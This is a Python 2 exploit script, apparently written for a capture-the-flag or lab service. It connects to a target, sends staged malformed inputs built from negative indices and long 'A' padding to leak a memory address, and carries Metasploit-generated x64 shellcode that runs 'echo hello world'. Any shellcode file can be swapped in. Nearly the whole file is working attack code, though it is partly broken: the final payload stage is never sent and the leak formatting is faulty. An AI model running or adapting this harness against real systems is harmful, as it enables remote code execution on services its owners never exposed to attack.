#!/usr/bin/python

import sys, getopt, socket, time

def read(s):
	s.setblocking(0)
	recv_buf = ''
	data = []
	timeout = 1
	
	begin=time.time()
	while 1:
		if data and time.time()-begin > timeout:
			break
		elif time.time()-begin > timeout*2:
			break
		try:
			recv_buf = s.recv(1024)
			if recv_buf:
				data.append(recv_buf)
				begin = time.time()
			else:
				time.sleep(0.25)
		except:
			pass
	print 'AWESOME'
	return ''.join(data)	

def main(argv):
	port = 80
	host = ''
	# linux/x64/exec - 56 bytes
	# http://www.metasploit.com
	# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
	# PrependSetreuid=false, PrependSetuid=false, 
	# PrependSetresgid=false, PrependSetregid=false, 
	# PrependSetgid=false, PrependChrootBreak=false, 
	# AppendExit=false, CMD=echo hello world
	buf =  ""
	buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
	buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
	buf += "\x52\xe8\x11\x00\x00\x00\x65\x63\x68\x6f\x20\x68\x65"
	buf += "\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x00\x56\x57\x48"
	buf += "\x89\xe6\x0f\x05"


	try:
		opts, args = getopt.getopt(argv,"ht:p:s:")
	except getopt.GetoptError:
		print 'Error Code: NOOB\n\tUse -h option for help'
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print 'Program created by Leander Metcalf\nLast updated July 30, 2015\n'
			print 'This program exploits based on shellcode you provide.'
			print 'Options will be added on a regular basis.'
			print '\tSample usage: exploit.py -t <host> -p <target port>\n'
			print '-t\tHost name of target'
			print '-p\tPort of target'
			print '-s\tBinary Shellcode'
			sys.exit()
		elif opt == '-t':
			host = arg
		elif opt == '-p':
			port = arg
		elif opt == '-s':
			try:
				sc = open(arg, "r")
				buf = sc.read()
				sc.close()
			except:
				print "There was an error reading %s" % arg
				sys.exit()

	if len(sys.argv) < 2:
		print 'Not enough arguments. Try -h.'
		sys.exit()

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ip = socket.gethostbyname(host)
		sock.connect((ip, int(port)))
		print 'Connection Sucessful'
	except socket.error, msg:
		print 'Error trying to connect.'
		sys.exit()
		
	stage1 = "a\n-28\n" + "A"*1000 + "\n"
	stage2 = "r\n1\n"
	stage3 = "a\n-500\n" + "A"*(1024-len(buf)) + buf + "\n"
	
	sys.stdout.write("Starting Exploit")
	print read(sock)
	sock.sendall(stage1)
	print read(sock)
	sock.sendall(stage2)
	LEAK = read(sock)[:4]
	print 'Leaked address is %x' % LEAK
	sock.close

if __name__ == "__main__":
	main(sys.argv[1:])
